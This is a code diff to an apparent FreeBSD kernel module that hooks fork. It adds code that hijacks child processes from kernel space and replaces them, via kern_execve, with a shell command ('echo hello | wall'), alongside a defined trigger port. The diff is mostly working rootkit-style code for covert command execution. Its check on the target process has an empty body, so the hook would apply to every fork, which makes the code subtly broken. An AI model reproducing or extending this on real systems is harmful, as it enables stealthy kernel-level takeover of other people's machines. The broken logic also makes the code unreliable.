@@ -25,6 +25,7 @@
 #include <sys/lock.h>     // Locking mechanisms
 #include <sys/sched.h>    // Needed for FIRST_THREAD_IN_PROC()
 #include <sys/unistd.h> // for RFPROC
+#include <sys/imgact.h> // For image_args
 
 // Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
@@ -46,10 +47,42 @@ static void __stack_chk_fail(void) {
 */
 // Custom func that will be invoked whenever do_fork() is invoked
 static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int flags) {
-    if (strcmp(parent->p_comm, TARGET_PROC) == 0) {
-        printf("Parent is apeshit!");
-
+    if (strcmp(parent->p_comm, TARGET_PROC) != 0) {
+        // do no custom functionality if this is a normal fork call
     }
+
+    struct thread *child_td;
+    struct image_args args;
+    int error;
+    child_td = FIRST_THREAD_IN_PROC(child);
+    if (child_td == NULL) {
+        printf("[LKM] Failed to get first thread of child process!\n");
+        return;
+    }
+
+    // Zero out the args structure
+    bzero(&args, sizeof(args));
+
+    // Define command and arguments: /bin/sh -c "echo hello"
+    char *argv[] = { "/bin/sh", "-c", "echo hello | wall", NULL };
+    char *envp[] = { "PATH=/bin:/usr/bin", NULL };  // Basic environment
+
+    // Copy arguments into image_args struct
+    // UIO_SYSSPACE is a flag that indicates the memory pointers (like command arguments) are coming from kernel space instead of user space.
+    error = exec_copyin_args(&args, argv[0], UIO_SYSSPACE, argv, envp);
+    if (error) {
+        printf("[LKM] exec_copyin_args failed: %d\n", error);
+        return;
+    }
+
+    // Execute the binary inside the child process
+    error = kern_execve(child_td, &args, NULL, child->p_vmspace);
+    if (error) {
+        printf("[LKM] kern_execve failed for: %d\n", error);
+    } else {
+        printf("[LKM] Successfully executed echo hello in child process!\n");
+    }
+
 
 }
 
